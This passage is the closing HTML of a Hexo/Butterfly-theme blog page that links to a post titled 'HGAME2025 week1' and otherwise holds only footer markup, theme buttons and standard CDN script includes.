href="/2025/02/23/HGAME2025-week1/" title="HGAME2025 week1">HGAME2025 week1</a><time datetime="2025-02-23T05:20:43.000Z" title="发表于 2025-02-23 13:20:43">2025-02-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/9.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2025 By B1ueL0n3</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="/js/title.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="90" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>